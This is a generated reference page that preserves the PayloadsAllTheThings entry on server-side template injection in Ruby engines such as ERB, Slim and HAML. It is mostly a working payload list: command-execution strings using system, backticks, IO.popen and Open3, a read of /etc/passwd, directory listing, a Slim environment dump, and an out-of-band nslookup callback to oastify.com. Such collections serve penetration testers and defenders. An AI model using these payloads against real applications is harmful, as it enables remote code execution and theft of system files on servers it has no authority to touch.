---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Server Side Template Injection - Ruby

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-server-side-template-injection-ruby` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/Ruby.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Server Side Template Injection - Ruby](../../topics/server-side-template-injection/server-side-template-injection-ruby.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-server-side-template-injection-ruby |
| name | Server Side Template Injection - Ruby |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Ruby.md |

## Preserved Source Material

````yaml
_body: "# Server Side Template Injection - Ruby\n\n> Server-Side Template Injection (SSTI)  is a vulnerability that arises\
  \ when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands.\
  \ In Ruby, SSTI can occur when using templating engines like ERB (Embedded Ruby), Haml, liquid, or Slim, especially when\
  \ user input is incorporated into templates without proper sanitization or validation.\n\n## Summary\n\n- [Templating Libraries](#templating-libraries)\n\
  - [Universal Payloads](#universal-payloads)\n- [Ruby](#ruby)\n    - [Ruby - Basic injections](#ruby---basic-injections)\n\
  \    - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)\n    - [Ruby - List files and directories](#ruby---list-files-and-directories)\n\
  \    - [Ruby - Remote Command execution](#ruby---remote-command-execution)\n- [References](#references)\n\n## Templating\
  \ Libraries\n\n| Template Name | Payload Format |\n|---------------|----------------|\n| Erb           | `<%= %>`      \
  \ |\n| Erubi         | `<%= %>`       |\n| Erubis        | `<%= %>`       |\n| HAML          | `#{ }`         |\n| Liquid\
  \        | `{{ }}`        |\n| Mustache      | `{{ }}`        |\n| Slim          | `#{ }`         |\n\n## Universal Payloads\n\
  \nGeneric code injection payloads work for many Ruby-based template engines, such as Erb, Erubi, Erubis, HAML and Slim.\n\
  \nTo use these payloads, wrap them in the appropriate tag.\n\n```ruby\n%x('id') # Rendered RCE\nFile.read(\"Y:/A:/\"+%x('id'))\
  \ # Error-Based RCE\n1/(system(\"id\")&&1||0) # Boolean-Based RCE\nsystem(\"id && sleep 5\") # Time-Based RCE\n```\n\n##\
  \ Ruby\n\n### Ruby - Basic injections\n\n**ERB**:\n\n```ruby\n<%= 7 * 7 %>\n```\n\n**Slim**:\n\n```ruby\n#{ 7 * 7 }\n```\n\
  \n### Ruby - Retrieve /etc/passwd\n\n```ruby\n<%= File.open('/etc/passwd').read %>\n```\n\n### Ruby - List files and directories\n\
  \n```ruby\n<%= Dir.entries('/') %>\n```\n\n### Ruby - Remote Command execution\n\nExecute code using SSTI for **Erb**,**Erubi**,**Erubis**\
  \ engine.\n\n```ruby\n<%=(`nslookup oastify.com`)%>\n<%= system('cat /etc/passwd') %>\n<%= `ls /` %>\n<%= IO.popen('ls /').readlines()\
  \  %>\n<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>\n<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami')\
  \ %><%= @c.readline()%>\n```\n\nExecute code using SSTI for **Slim** engine.\n\n```powershell\n#{ %x|env| }\n```\n\n## References\n\
  \n- [Ruby ERB Template Injection - Scott White & Geoff Walton - September 13, 2017](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)\n\
  - [Successful Errors: New Code Injection and SSTI Techniques - Vladislav Korchagin - January 3, 2026](https://github.com/vladko312/Research_Successful_Errors/blob/main/README.md)"
_relative_path: Server Side Template Injection/Ruby.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Server Side Template Injection/Ruby.md
````
